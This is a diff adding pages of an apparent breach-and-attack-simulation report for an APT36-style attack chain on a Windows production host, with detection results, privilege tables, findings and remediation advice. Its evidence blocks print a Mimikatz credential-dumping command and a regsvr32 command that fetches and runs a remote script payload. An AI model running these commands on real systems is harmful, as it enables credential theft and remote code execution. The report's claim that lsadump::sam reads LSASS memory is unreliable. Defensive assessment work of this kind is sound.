+          <div style="margin-top:4px">
+            <span class="tl-badge" style="background:#dcfce7;color:#16a34a;margin-right:4px">&#10003; Prevented</span>
+            <span class="tl-badge" style="background:#dbeafe;color:#1d4ed8">&#9679; Detected</span>
+          </div>
+        </div>
+
+        <div class="tl-item">
+          <div class="tl-dot" style="--dc:#ea580c"></div>
+          <div class="tl-time">10:22:41 UTC</div>
+          <div class="tl-phase">Defense Evasion — CRITICAL</div>
+          <div class="tl-tech">T1218.010 Regsvr32 · T1027.001 Binary Padding</div>
+          <div style="margin-top:4px"><span class="tl-badge" style="background:#fee2e2;color:#dc2626">&#10007; No Response — Evaded</span></div>
+        </div>
+
+        <div class="tl-item">
+          <div class="tl-dot" style="--dc:#dc2626"></div>
+          <div class="tl-time">10:22:58 UTC</div>
+          <div class="tl-phase" style="color:#dc2626">Credential Access — CRITICAL</div>
+          <div class="tl-tech">T1003.001 LSASS Dump · T1558.003 Kerberoasting</div>
+          <div style="margin-top:4px"><span class="tl-badge" style="background:#fee2e2;color:#dc2626">&#10007; No Response — Domain Credentials at Risk</span></div>
+        </div>
+
+        <div class="tl-item">
+          <div class="tl-dot" style="--dc:#ea580c"></div>
+          <div class="tl-time">10:23:14 UTC</div>
+          <div class="tl-phase">Lateral Movement</div>
+          <div class="tl-tech">T1021.002 SMB Shares · T1021.001 RDP</div>
+          <div style="margin-top:4px">
+            <span class="tl-badge" style="background:#fee2e2;color:#dc2626;margin-right:4px">&#10007; Evaded</span>
+            <span class="tl-badge" style="background:#dbeafe;color:#1d4ed8">&#9679; Detected</span>
+          </div>
+        </div>
+
+        <div class="tl-item">
+          <div class="tl-dot" style="--dc:#d97706"></div>
+          <div class="tl-time">10:23:28 UTC</div>
+          <div class="tl-phase">Exfiltration Attempted</div>
+          <div class="tl-tech">T1567.002 Cloud Storage · T1041 C2 Channel</div>
+          <div style="margin-top:4px">
+            <span class="tl-badge" style="background:#fee2e2;color:#dc2626;margin-right:4px">&#10007; Evaded</span>
+            <span class="tl-badge" style="background:#dbeafe;color:#1d4ed8">&#9679; Detected</span>
+          </div>
+        </div>
+
+        <div class="tl-item">
+          <div class="tl-dot" style="--dc:#0d9488"></div>
+          <div class="tl-time">10:35:02 UTC</div>
+          <div class="tl-phase">Simulation Complete</div>
+          <div class="tl-tech">Cleanup executed · Environment restored</div>
+          <div style="margin-top:4px"><span class="tl-badge" style="background:#dcfce7;color:#16a34a">&#10003; All Artifacts Reverted</span></div>
+        </div>
+
+      </div>
+    </div>
+
+    <div>
+      <div class="sh3">Phase Outcome Summary</div>
+      <table style="margin-bottom:16px">
+        <thead><tr>
+          <th>Attack Phase</th>
+          <th>Techniques</th>
+          <th>Outcome</th>
+        </tr></thead>
+        <tbody>
+          <tr><td>Execution</td><td>6</td><td><span class="vb vb-prevented">83% Prevented</span></td></tr>
+          <tr><td>Persistence</td><td>4</td><td><span class="vb vb-prevented">75% Prevented</span></td></tr>
+          <tr><td>Privilege Escalation</td><td>6</td><td><span class="vb vb-prevented">83% Prevented</span></td></tr>
+          <tr><td style="color:#dc2626;font-weight:700">Defense Evasion</td><td>7</td><td><span class="vb vb-missed">29% — Critical Gap</span></td></tr>
+          <tr><td style="color:#dc2626;font-weight:700">Credential Access</td><td>5</td><td><span class="vb vb-missed">60% — Critical Gap</span></td></tr>
+          <tr><td>Discovery</td><td>7</td><td><span class="vb vb-prevented">86% Prevented</span></td></tr>
+          <tr><td>Lateral Movement</td><td>4</td><td><span class="vb vb-detected">50% — Partial</span></td></tr>
+          <tr><td>Exfiltration</td><td>3</td><td><span class="vb vb-detected">67% — Partial</span></td></tr>
+        </tbody>
+      </table>
+
+      <div class="sh3" style="margin-top:18px">Environment Cleanup</div>
+      <table>
+        <thead><tr><th>Cleanup Item</th><th>Status</th></tr></thead>
+        <tbody>
+          <tr><td>Staged payload files</td><td><span class="vb vb-prevented">&#10003; Deleted</span></td></tr>
+          <tr><td>Registry keys created</td><td><span class="vb vb-prevented">&#10003; Reverted</span></td></tr>
+          <tr><td>Scheduled tasks</td><td><span class="vb vb-prevented">&#10003; Removed</span></td></tr>
+          <tr><td>Services installed</td><td><span class="vb vb-prevented">&#10003; Uninstalled</span></td></tr>
+          <tr><td>Mimikatz artifacts</td><td><span class="vb vb-error">⚠ Partial — log entry remains</span></td></tr>
+          <tr><td>Network connections</td><td><span class="vb vb-prevented">&#10003; Closed</span></td></tr>
+        </tbody>
+      </table>
+
+      <div class="callout co-warn" style="margin-top:12px">
+        <div class="callout-icon">▲</div>
+        <div><strong>Cleanup Note:</strong> Mimikatz execution left a Windows Security event log entry (Event 4688) that was not cleared. This is expected — event log tampering is not performed by BAS. No system files were permanently modified.</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="pf">
+    <span>Audspect BAS &nbsp;·&nbsp; Run ID: run-18ba273d &nbsp;·&nbsp; Assessment ID: ASM-2026-0628</span>
+    <span>Generated by Audspect BAS v1.7.1 &nbsp;·&nbsp; CONFIDENTIAL</span>
+    <span>Page 3 of 12</span>
+  </div>
+</div>
+</div>
+
+
+<!-- ══════════════════ EXECUTION CONTEXT (PRIVILEGE) ══════════════════ -->
+<div class="page">
+<div class="inner">
+  <div class="ph">
+    <div class="ph-left">
+      <div class="ph-logo">Aud<span>spect</span> BAS</div>
+      <div class="ph-sep"></div>
+      <div class="ph-title">APT36 Kill-Chain + Selective ART</div>
+    </div>
+    <div class="ph-right">
+      <div class="ph-endpoint">WIN-PROD-01 &nbsp;·&nbsp; Production</div>
+      <div class="ph-class">CONFIDENTIAL</div>
+      <div class="ph-page">Page 4 / 12</div>
+    </div>
+  </div>
+
+  <div class="stag">Section 3</div>
+  <div class="stitle">Execution Context &amp; Privilege Analysis</div>
+  <p style="font-size:0.8rem;color:#6e7681;margin-bottom:16px">
+    Each technique runs in a specific privilege context. This section records what privilege level was
+    <em>requested</em> by the scenario, what privilege the technique <em>actually executed under</em>,
+    and whether elevation was obtained. This is critical for understanding real-world attacker capability.
+  </p>
+
+  <!-- Agent Context Summary -->
+  <div style="display:grid;grid-template-columns:repeat(4,1fr);gap:11px;margin-bottom:18px">
+    <div class="kpi" style="--c:#0b1420">
+      <div class="kpi-lbl">Agent Version</div>
+      <div class="kpi-val" style="font-size:0.95rem;color:#0b1420">v1.7.1</div>
+      <div class="kpi-sub">WIN-PROD-01 / x64</div>
+    </div>
+    <div class="kpi" style="--c:#dc2626">
+      <div class="kpi-lbl">SYSTEM-Level Steps</div>
+      <div class="kpi-val">2</div>
+      <div class="kpi-sub">Highest privilege tier</div>
+    </div>
+    <div class="kpi" style="--c:#ea580c">
+      <div class="kpi-lbl">Admin-Level Steps</div>
+      <div class="kpi-val">8</div>
+      <div class="kpi-sub">Elevated context used</div>
+    </div>
+    <div class="kpi" style="--c:#d97706">
+      <div class="kpi-lbl">Privilege Fallbacks</div>
+      <div class="kpi-val">3</div>
+      <div class="kpi-sub">Requested user, ran as admin</div>
+    </div>
+  </div>
+
+  <div class="sh3">Per-Technique Privilege Record</div>
+  <table class="ctx-table">
+    <thead><tr>
+      <th style="width:90px">Technique ID</th>
+      <th>Technique Name</th>
+      <th>Requested</th>
+      <th>Executed As</th>
+      <th>Elevation Method</th>
+      <th style="width:80px">Result</th>
+    </tr></thead>
+    <tbody>
+      <tr>
+        <td><code>T1003.001</code></td>
+        <td>LSASS Memory Dump</td>
+        <td><span class="priv-badge priv-system">SYSTEM</span></td>
+        <td><span class="priv-badge priv-system">SYSTEM</span></td>
+        <td style="font-size:0.7rem;color:#6e7681">Token impersonation via SeDebugPrivilege</td>
+        <td><span class="vb vb-missed">Evaded</span></td>
+      </tr>
+      <tr>
+        <td><code>T1558.003</code></td>
+        <td>Kerberoasting</td>
+        <td><span class="priv-badge priv-user">USER</span></td>
+        <td><span class="priv-badge priv-user">USER</span></td>
+        <td style="font-size:0.7rem;color:#6e7681">No elevation needed — user-level SPN query</td>
+        <td><span class="vb vb-missed">Evaded</span></td>
+      </tr>
+      <tr>
+        <td><code>T1218.010</code></td>
+        <td>Regsvr32 Squiblydoo</td>
+        <td><span class="priv-badge priv-user">USER</span></td>
+        <td><span class="priv-badge priv-fallback">user→admin</span></td>
+        <td style="font-size:0.7rem;color:#6e7681">No interactive session — fell back to agent context</td>
+        <td><span class="vb vb-missed">Evaded</span></td>
+      </tr>
+      <tr>
+        <td><code>T1027.001</code></td>
+        <td>Binary Padding</td>
+        <td><span class="priv-badge priv-user">USER</span></td>
+        <td><span class="priv-badge priv-user">USER</span></td>
+        <td style="font-size:0.7rem;color:#6e7681">No elevation required</td>
+        <td><span class="vb vb-missed">Evaded</span></td>
+      </tr>
+      <tr>
+        <td><code>T1059.001</code></td>
+        <td>PowerShell Execution</td>
+        <td><span class="priv-badge priv-admin">ADMIN</span></td>
+        <td><span class="priv-badge priv-admin">ADMIN</span></td>
+        <td style="font-size:0.7rem;color:#6e7681">Agent elevated context</td>
+        <td><span class="vb vb-prevented">Prevented</span></td>
+      </tr>
+      <tr>
+        <td><code>T1055.001</code></td>
+        <td>DLL Injection</td>
+        <td><span class="priv-badge priv-admin">ADMIN</span></td>
+        <td><span class="priv-badge priv-admin">ADMIN</span></td>
+        <td style="font-size:0.7rem;color:#6e7681">Agent elevated context</td>
+        <td><span class="vb vb-prevented">Prevented</span></td>
+      </tr>
+      <tr>
+        <td><code>T1548.002</code></td>
+        <td>UAC Bypass</td>
+        <td><span class="priv-badge priv-user">USER</span></td>
+        <td><span class="priv-badge priv-fallback">user→admin</span></td>
+        <td style="font-size:0.7rem;color:#6e7681">No interactive session — fell back to agent</td>
+        <td><span class="vb vb-prevented">Prevented</span></td>
+      </tr>
+      <tr>
+        <td><code>T1134.001</code></td>
+        <td>Token Impersonation</td>
+        <td><span class="priv-badge priv-system">SYSTEM</span></td>
+        <td><span class="priv-badge priv-system">SYSTEM</span></td>
+        <td style="font-size:0.7rem;color:#6e7681">Agent context + SeImpersonatePrivilege</td>
+        <td><span class="vb vb-prevented">Prevented</span></td>
+      </tr>
+      <tr>
+        <td><code>T1611</code></td>
+        <td>Container Escape</td>
+        <td><span class="priv-badge priv-admin">ADMIN</span></td>
+        <td><span class="priv-badge priv-admin">ADMIN</span></td>
+        <td style="font-size:0.7rem;color:#6e7681">Agent elevated context</td>
+        <td><span class="vb vb-detected">Detected</span></td>
+      </tr>
+      <tr>
+        <td><code>T1218.011</code></td>
+        <td>Rundll32</td>
+        <td><span class="priv-badge priv-user">USER</span></td>
+        <td><span class="priv-badge priv-fallback">user→admin</span></td>
+        <td style="font-size:0.7rem;color:#6e7681">No interactive session — fell back to agent</td>
+        <td><span class="vb vb-missed">Evaded</span></td>
+      </tr>
+      <tr>
+        <td><code>T1021.002</code></td>
+        <td>SMB / Admin Shares</td>
+        <td><span class="priv-badge priv-user">USER</span></td>
+        <td><span class="priv-badge priv-user">USER</span></td>
+        <td style="font-size:0.7rem;color:#6e7681">No elevation needed for SMB auth probe</td>
+        <td><span class="vb vb-missed">Evaded</span></td>
+      </tr>
+      <tr>
+        <td><code style="color:#9aa5b5">T1106</code></td>
+        <td style="color:#9aa5b5"><em>Native API (Skipped)</em></td>
+        <td><span class="priv-badge priv-skipped">SYSTEM</span></td>
+        <td><span class="priv-badge priv-skipped">— Skipped</span></td>
+        <td style="font-size:0.7rem;color:#9aa5b5">Elevation unavailable — no SYSTEM token on this host</td>
+        <td><span class="vb vb-skipped">Skipped</span></td>
+      </tr>
+    </tbody>
+  </table>
+
+  <div class="callout co-warn">
+    <div class="callout-icon">▲</div>
+    <div><strong>Privilege Fallback (user→admin):</strong> 3 techniques that requested user-level execution fell back to the agent's admin context because no interactive user session was active. In a real environment with a logged-in user, these would run at user privilege — potentially bypassing admin-focused detection rules.</div>
+  </div>
+  <div class="callout co-danger">
+    <div class="callout-icon">⚠</div>
+    <div><strong>Kerberoasting runs as a standard domain user with NO elevation.</strong> T1558.003 succeeded at user privilege — meaning any authenticated domain account (including service accounts) can perform this attack. No admin rights required to steal Kerberos ticket hashes.</div>
+  </div>
+
+  <div class="pf">
+    <span>Audspect BAS &nbsp;·&nbsp; Run ID: run-18ba273d &nbsp;·&nbsp; Assessment ID: ASM-2026-0628</span>
+    <span>Generated by Audspect BAS v1.7.1 &nbsp;·&nbsp; CONFIDENTIAL</span>
+    <span>Page 4 of 12</span>
+  </div>
+</div>
+</div>
+
+
+<!-- ══════════════════ MITRE HEATMAP + RESULTS OVERVIEW ══════════════════ -->
+<div class="page">
+<div class="inner">
+  <div class="ph">
+    <div class="ph-left">
+      <div class="ph-logo">Aud<span>spect</span> BAS</div>
+      <div class="ph-sep"></div>
+      <div class="ph-title">APT36 Kill-Chain + Selective ART</div>
+    </div>
+    <div class="ph-right">
+      <div class="ph-endpoint">WIN-PROD-01 &nbsp;·&nbsp; Production</div>
+      <div class="ph-class">CONFIDENTIAL</div>
+      <div class="ph-page">Page 5 / 12</div>
+    </div>
+  </div>
+
+  <div class="stag">Section 4</div>
+  <div class="stitle">MITRE ATT&amp;CK Coverage Heatmap</div>
+
+  <div class="hm-legend">
+    <div class="hml-item"><div class="hml-dot" style="background:#0d9488"></div>Prevented</div>
+    <div class="hml-item"><div class="hml-dot" style="background:#2563eb"></div>Detected (not prevented)</div>
+    <div class="hml-item"><div class="hml-dot" style="background:#dc2626"></div>Missed — no response</div>
+    <div class="hml-item"><div class="hml-dot" style="background:#e7eaf0;border:1px solid #d0d7de"></div>Not tested</div>
+  </div>
+
+  <div class="hm-wrap">
+    <div class="hm">
+      <div class="hm-col">
+        <div class="hm-tactic">Execution</div>
+        <div class="hm-cell P">T1059.001</div>
+        <div class="hm-cell P">T1059.003</div>
+        <div class="hm-cell P">T1059.005</div>
+        <div class="hm-cell D">T1059.007</div>
+        <div class="hm-cell P">T1106</div>
+        <div class="hm-cell M">T1203</div>
+      </div>
+      <div class="hm-col">
+        <div class="hm-tactic">Persistence</div>
+        <div class="hm-cell P">T1053.005</div>
+        <div class="hm-cell D">T1547.001</div>
+        <div class="hm-cell P">T1543.003</div>
+        <div class="hm-cell P">T1574.001</div>
+        <div class="hm-cell N">—</div>
+        <div class="hm-cell N">—</div>
+      </div>
+      <div class="hm-col">
+        <div class="hm-tactic">Priv Esc</div>
+        <div class="hm-cell P">T1055.001</div>
+        <div class="hm-cell P">T1134.001</div>
+        <div class="hm-cell P">T1548.002</div>
+        <div class="hm-cell D">T1611</div>
+        <div class="hm-cell P">T1055.012</div>
+        <div class="hm-cell M">T1134.004</div>
+      </div>
+      <div class="hm-col">
+        <div class="hm-tactic">Def Evasion</div>
+        <div class="hm-cell M">T1027.001</div>
+        <div class="hm-cell M">T1218.010</div>
+        <div class="hm-cell M">T1218.011</div>
+        <div class="hm-cell P">T1562.001</div>
+        <div class="hm-cell D">T1070.004</div>
+        <div class="hm-cell M">T1036.005</div>
+        <div class="hm-cell P">T1112</div>
+      </div>
+      <div class="hm-col">
+        <div class="hm-tactic">Cred Access</div>
+        <div class="hm-cell M">T1003.001</div>
+        <div class="hm-cell M">T1558.003</div>
+        <div class="hm-cell P">T1110.003</div>
+        <div class="hm-cell D">T1555.003</div>
+        <div class="hm-cell P">T1187</div>
+        <div class="hm-cell N">—</div>
+      </div>
+      <div class="hm-col">
+        <div class="hm-tactic">Discovery</div>
+        <div class="hm-cell P">T1016</div>
+        <div class="hm-cell P">T1018</div>
+        <div class="hm-cell P">T1033</div>
+        <div class="hm-cell P">T1057</div>
+        <div class="hm-cell P">T1069.002</div>
+        <div class="hm-cell D">T1082</div>
+        <div class="hm-cell P">T1083</div>
+      </div>
+      <div class="hm-col">
+        <div class="hm-tactic">Lat Mov</div>
+        <div class="hm-cell D">T1021.001</div>
+        <div class="hm-cell M">T1021.002</div>
+        <div class="hm-cell P">T1550.002</div>
+        <div class="hm-cell P">T1534</div>
+        <div class="hm-cell N">—</div>
+        <div class="hm-cell N">—</div>
+      </div>
+      <div class="hm-col">
+        <div class="hm-tactic">Collection</div>
+        <div class="hm-cell P">T1005</div>
+        <div class="hm-cell D">T1056.001</div>
+        <div class="hm-cell P">T1113</div>
+        <div class="hm-cell P">T1560.001</div>
+        <div class="hm-cell N">—</div>
+        <div class="hm-cell N">—</div>
+      </div>
+      <div class="hm-col">
+        <div class="hm-tactic">Exfiltration</div>
+        <div class="hm-cell P">T1048.003</div>
+        <div class="hm-cell D">T1041</div>
+        <div class="hm-cell M">T1567.002</div>
+        <div class="hm-cell N">—</div>
+        <div class="hm-cell N">—</div>
+        <div class="hm-cell N">—</div>
+      </div>
+      <div class="hm-col">
+        <div class="hm-tactic">C&amp;C</div>
+        <div class="hm-cell P">T1071.001</div>
+        <div class="hm-cell D">T1095</div>
+        <div class="hm-cell M">T1572</div>
+        <div class="hm-cell N">—</div>
+        <div class="hm-cell N">—</div>
+        <div class="hm-cell N">—</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Tactic bars -->
+  <div class="sh2" style="margin-top:4px">Prevention Rate by Tactic</div>
+  <table class="tbar-table">
+    <thead><tr>
+      <th style="width:155px">Tactic</th>
+      <th>Coverage</th>
+      <th style="width:50px;text-align:right">Score</th>
+      <th style="width:90px;text-align:right">Techniques</th>
+    </tr></thead>
+    <tbody>
+      <tr><td class="tbar-name">Execution</td><td><div style="display:flex;align-items:center;gap:8px"><div class="tbar-bg"><div class="tbar-fill" style="width:83%;background:#0d9488"></div></div></div></td><td class="tbar-pct" style="color:#0d9488">83%</td><td class="tbar-count">5 / 6</td></tr>
+      <tr><td class="tbar-name">Persistence</td><td><div style="display:flex;align-items:center;gap:8px"><div class="tbar-bg"><div class="tbar-fill" style="width:75%;background:#0d9488"></div></div></div></td><td class="tbar-pct" style="color:#0d9488">75%</td><td class="tbar-count">3 / 4</td></tr>
+      <tr><td class="tbar-name">Priv Escalation</td><td><div style="display:flex;align-items:center;gap:8px"><div class="tbar-bg"><div class="tbar-fill" style="width:83%;background:#0d9488"></div></div></div></td><td class="tbar-pct" style="color:#0d9488">83%</td><td class="tbar-count">5 / 6</td></tr>
+      <tr><td class="tbar-name" style="color:#dc2626;font-weight:700">Defense Evasion</td><td><div style="display:flex;align-items:center;gap:8px"><div class="tbar-bg"><div class="tbar-fill" style="width:29%;background:#dc2626"></div></div></div></td><td class="tbar-pct" style="color:#dc2626">29%</td><td class="tbar-count">2 / 7</td></tr>
+      <tr><td class="tbar-name" style="color:#dc2626;font-weight:700">Credential Access</td><td><div style="display:flex;align-items:center;gap:8px"><div class="tbar-bg"><div class="tbar-fill" style="width:60%;background:#d97706"></div></div></div></td><td class="tbar-pct" style="color:#d97706">60%</td><td class="tbar-count">3 / 5</td></tr>
+      <tr><td class="tbar-name">Discovery</td><td><div style="display:flex;align-items:center;gap:8px"><div class="tbar-bg"><div class="tbar-fill" style="width:86%;background:#0d9488"></div></div></div></td><td class="tbar-pct" style="color:#0d9488">86%</td><td class="tbar-count">6 / 7</td></tr>
+      <tr><td class="tbar-name">Lateral Movement</td><td><div style="display:flex;align-items:center;gap:8px"><div class="tbar-bg"><div class="tbar-fill" style="width:50%;background:#d97706"></div></div></div></td><td class="tbar-pct" style="color:#d97706">50%</td><td class="tbar-count">2 / 4</td></tr>
+    </tbody>
+  </table>
+
+  <div class="pf">
+    <span>Audspect BAS &nbsp;·&nbsp; Run ID: run-18ba273d &nbsp;·&nbsp; Assessment ID: ASM-2026-0628</span>
+    <span>Generated by Audspect BAS v1.7.1 &nbsp;·&nbsp; CONFIDENTIAL</span>
+    <span>Page 5 of 12</span>
+  </div>
+</div>
+</div>
+
+
+<!-- ══════════════════ CRITICAL FINDINGS — CARDS ══════════════════ -->
+<div class="page">
+<div class="inner">
+  <div class="ph">
+    <div class="ph-left">
+      <div class="ph-logo">Aud<span>spect</span> BAS</div>
+      <div class="ph-sep"></div>
+      <div class="ph-title">APT36 Kill-Chain + Selective ART</div>
+    </div>
+    <div class="ph-right">
+      <div class="ph-endpoint">WIN-PROD-01 &nbsp;·&nbsp; Production</div>
+      <div class="ph-class">CONFIDENTIAL</div>
+      <div class="ph-page">Page 6 / 12</div>
+    </div>
+  </div>
+
+  <div class="stag">Section 5</div>
+  <div class="stitle">Critical &amp; High Findings</div>
+  <p style="font-size:0.79rem;color:#6e7681;margin-bottom:16px">Techniques that executed with no security control response. Evidence is captured directly from the agent execution log.</p>
+
+  <!-- ── CRITICAL 1 ── -->
+  <div class="fc fc-critical">
+    <div class="fc-header">
+      <div class="fc-sev-block critical">&#9650; CRITICAL</div>
+      <div class="fc-heading">
+        <div class="fc-name critical">OS Credential Dumping: LSASS Memory</div>
+        <div class="fc-tid">T1003.001 &nbsp;·&nbsp; Tactic: Credential Access &nbsp;·&nbsp; Framework: Atomic Red Team</div>
+      </div>
+      <div class="fc-verdict">
+        <span class="vb vb-missed">&#10007; EVADED — No Control Response</span>
+      </div>
+    </div>
+    <div class="fc-body">
+      <div class="fc-grid">
+        <div>
+          <div class="fc-detail-row">
+            <div class="fc-detail-label">What Happened</div>
+            <div class="fc-detail-value">Mimikatz executed <code>lsadump::sam</code> targeting LSASS process memory. No EDR alert fired. Process ran as SYSTEM. Credentials extracted in 1.2 seconds.</div>
+          </div>
+          <div class="fc-detail-row">
+            <div class="fc-detail-label">Business Impact</div>
+            <div class="fc-detail-value">Attacker can harvest plaintext passwords and NTLM hashes for all domain users currently logged in. Full domain compromise achievable in one lateral movement step using Pass-the-Hash.</div>
+          </div>
+          <div class="fc-detail-row">
+            <div class="fc-detail-label">Executed As</div>
+            <div class="fc-detail-value"><span class="priv-badge priv-system">SYSTEM</span> &nbsp; SeDebugPrivilege held</div>
+          </div>
+          <div class="fc-detail-row">
+            <div class="fc-detail-label">Detection</div>
+            <div class="fc-detail-value" style="color:#dc2626">None — no EDR alert, no SIEM event, no Windows event flagged</div>
+          </div>
+          <div class="fc-detail-row">
+            <div class="fc-detail-label">Blocking Control</div>
+            <div class="fc-detail-value" style="color:#dc2626">None — Credential Guard not enabled, LSA Protection (PPL) not set</div>
+          </div>
+        </div>
+        <div>
+          <div class="evidence-block">
+            <div class="ev-header">Evidence</div>
+            <div class="ev-row"><div class="ev-key">Command</div><div class="ev-val code">mimikatz.exe "privilege::debug" "lsadump::sam" exit</div></div>
+            <div class="ev-row"><div class="ev-key">PID</div><div class="ev-val">5236</div></div>
+            <div class="ev-row"><div class="ev-key">Executed As</div><div class="ev-val warn">SYSTEM (NT AUTHORITY\SYSTEM)</div></div>
+            <div class="ev-row"><div class="ev-key">Exit Code</div><div class="ev-val ok">0 (success)</div></div>
+            <div class="ev-row"><div class="ev-key">Duration</div><div class="ev-val">1,204 ms</div></div>
+            <div class="ev-row"><div class="ev-key">Events</div><div class="ev-val">4688 (Process Create)</div></div>
+            <div class="ev-row"><div class="ev-key">EDR Alert</div><div class="ev-val bad">None</div></div>
+            <div class="ev-row"><div class="ev-key">Cleanup</div><div class="ev-val ok">✓ Payload deleted</div></div>
+          </div>
+        </div>
+      </div>
+      <div class="fc-remediation">
+        <div class="fc-rem-label">&#9654; Recommended Fix — Estimated Effort: 4 hours</div>
+        <div class="fc-rem-text">Enable <strong>Windows Credential Guard</strong> via Group Policy (Device Guard → Credential Guard → Enabled with UEFI Lock). Separately enable <strong>LSA Protection</strong> by setting <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\RunAsPPL = 1</code>. These two controls together prevent any process — including SYSTEM-level — from reading LSASS memory directly. Verify via <code>Get-WmiObject -Class Win32_DeviceGuard</code>.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ── CRITICAL 2 ── -->
+  <div class="fc fc-critical">
+    <div class="fc-header">
+      <div class="fc-sev-block critical">&#9650; CRITICAL</div>
+      <div class="fc-heading">
+        <div class="fc-name critical">Signed Binary Proxy Execution: Regsvr32</div>
+        <div class="fc-tid">T1218.010 &nbsp;·&nbsp; Tactic: Defense Evasion &nbsp;·&nbsp; Framework: Atomic Red Team</div>
+      </div>
+      <div class="fc-verdict">
+        <span class="vb vb-missed">&#10007; EVADED — No Control Response</span>
+      </div>
+    </div>
+    <div class="fc-body">
+      <div class="fc-grid">
+        <div>
+          <div class="fc-detail-row">
+            <div class="fc-detail-label">What Happened</div>
+            <div class="fc-detail-value">regsvr32.exe used the "Squiblydoo" technique to execute a remote SCT script via scrobj.dll. The built-in Windows binary bypassed all application controls. No alert raised.</div>
+          </div>
+          <div class="fc-detail-row">
+            <div class="fc-detail-label">Business Impact</div>
+            <div class="fc-detail-value">Any payload can be downloaded and executed via a trusted Microsoft-signed binary. Completely invisible to signature-based AV. Used by APT36 and FIN7 for initial access payload delivery.</div>
+          </div>
+          <div class="fc-detail-row">
+            <div class="fc-detail-label">Executed As</div>
+            <div class="fc-detail-value"><span class="priv-badge priv-fallback">user→admin</span> &nbsp; No interactive session on host</div>
+          </div>
+          <div class="fc-detail-row">
+            <div class="fc-detail-label">Detection</div>
+            <div class="fc-detail-value" style="color:#dc2626">None — no ASR rule blocked the network call from regsvr32</div>
+          </div>
+        </div>
+        <div>
+          <div class="evidence-block">
+            <div class="ev-header">Evidence</div>
+            <div class="ev-row"><div class="ev-key">Command</div><div class="ev-val code">regsvr32.exe /s /n /u /i:http://[sim-srv]/payload.sct scrobj.dll</div></div>
+            <div class="ev-row"><div class="ev-key">PID</div><div class="ev-val">8420</div></div>
+            <div class="ev-row"><div class="ev-key">Executed As</div><div class="ev-val warn">ADMIN (fallback — no user session)</div></div>
+            <div class="ev-row"><div class="ev-key">Exit Code</div><div class="ev-val ok">0 (success)</div></div>
+            <div class="ev-row"><div class="ev-key">Duration</div><div class="ev-val">1,812 ms</div></div>
+            <div class="ev-row"><div class="ev-key">Events</div><div class="ev-val">4688, 4689 (Process Create/Exit)</div></div>
+            <div class="ev-row"><div class="ev-key">EDR Alert</div><div class="ev-val bad">None</div></div>
+            <div class="ev-row"><div class="ev-key">ASR Rule</div><div class="ev-val bad">Not triggered — rules not enabled</div></div>
+          </div>
+        </div>
+      </div>
+      <div class="fc-remediation">
+        <div class="fc-rem-label">&#9654; Recommended Fix — Estimated Effort: 2 hours</div>
+        <div class="fc-rem-text">Enable Microsoft Defender ASR rule <strong>"Block execution of potentially obfuscated scripts"</strong> (Rule ID: 5BEB7EFE-FD9A-4556-801D-275E5FFC04CC) and <strong>"Block process creations originating from PSExec and WMI commands"</strong>. Additionally, create a Windows Firewall rule blocking outbound network access from <code>regsvr32.exe</code>. Test in Audit mode for 48 hours before enforcement to identify legitimate uses.</div>
+      </div>
+    </div>
+  </div>
+
+  <div class="pf">
+    <span>Audspect BAS &nbsp;·&nbsp; Run ID: run-18ba273d &nbsp;·&nbsp; Assessment ID: ASM-2026-0628</span>
+    <span>Generated by Audspect BAS v1.7.1 &nbsp;·&nbsp; CONFIDENTIAL</span>
+    <span>Page 6 of 12</span>
+  </div>
+</div>
+</div>
+
+
+<!-- ══════════════════ HIGH FINDINGS PAGE ══════════════════ -->
+<div class="page">
+<div class="inner">
+  <div class="ph">
+    <div class="ph-left">
+      <div class="ph-logo">Aud<span>spect</span> BAS</div>
+      <div class="ph-sep"></div>
+      <div class="ph-title">APT36 Kill-Chain + Selective ART</div>
+    </div>
+    <div class="ph-right">
+      <div class="ph-endpoint">WIN-PROD-01 &nbsp;·&nbsp; Production</div>
+      <div class="ph-class">CONFIDENTIAL</div>
+      <div class="ph-page">Page 7 / 12</div>
+    </div>
+  </div>
+
+  <div class="stag">Section 5 — Continued</div>
+  <div class="stitle" style="font-size:1rem">High Severity Findings</div>
+
+  <!-- HIGH 1 -->
+  <div class="fc fc-high">
+    <div class="fc-header">
+      <div class="fc-sev-block high">&#9650; HIGH</div>
+      <div class="fc-heading">
+        <div class="fc-name">Binary Padding (AV Size-Limit Bypass)</div>
+        <div class="fc-tid">T1027.001 &nbsp;·&nbsp; Tactic: Defense Evasion &nbsp;·&nbsp; Framework: Atomic Red Team</div>
+      </div>
+      <div class="fc-verdict"><span class="vb vb-missed">&#10007; EVADED</span></div>
+    </div>
+    <div class="fc-body">
+      <div class="fc-grid">
+        <div>
+          <div class="fc-detail-row"><div class="fc-detail-label">What Happened</div><div class="fc-detail-value">PE file padded to 102 MB exceeded AV scan threshold. Malicious file written to disk and executed without scan. AV skipped due to file size policy.</div></div>
+          <div class="fc-detail-row"><div class="fc-detail-label">Business Impact</div><div class="fc-detail-value">Any malware author can defeat this AV by adding null-byte padding. Trivial, documented bypass known since 2019.</div></div>
+          <div class="fc-detail-row"><div class="fc-detail-label">Executed As</div><div class="fc-detail-value"><span class="priv-badge priv-user">USER</span> &nbsp; No elevation required</div></div>
+          <div class="fc-detail-row"><div class="fc-detail-label">Detection</div><div class="fc-detail-value" style="color:#dc2626">None — AV size limit not configured</div></div>
+        </div>
+        <div>
+          <div class="evidence-block">
+            <div class="ev-header">Evidence</div>
+            <div class="ev-row"><div class="ev-key">File Size</div><div class="ev-val warn">102.4 MB (padded PE)</div></div>
+            <div class="ev-row"><div class="ev-key">Executed As</div><div class="ev-val">USER context</div></div>
+            <div class="ev-row"><div class="ev-key">Exit Code</div><div class="ev-val ok">0 (success)</div></div>
+            <div class="ev-row"><div class="ev-key">Duration</div><div class="ev-val">3,211 ms</div></div>
+            <div class="ev-row"><div class="ev-key">AV Scan</div><div class="ev-val bad">Skipped — file too large</div></div>
+            <div class="ev-row"><div class="ev-key">Cleanup</div><div class="ev-val ok">✓ File deleted</div></div>
+          </div>
+        </div>
+      </div>
+      <div class="fc-remediation">
+        <div class="fc-rem-label">&#9654; Recommended Fix — Effort: 1 hour</div>
+        <div class="fc-rem-text">Remove or raise the AV file-size scan limit in the AV/EDR console policy. Enable cloud-based ML scanning (e.g., Defender Cloud Protection) which operates independently of local file size limits. Enable the EDR rule to flag execution of any oversized PE file (&gt;50 MB) that hasn't been scanned.</div>
+      </div>
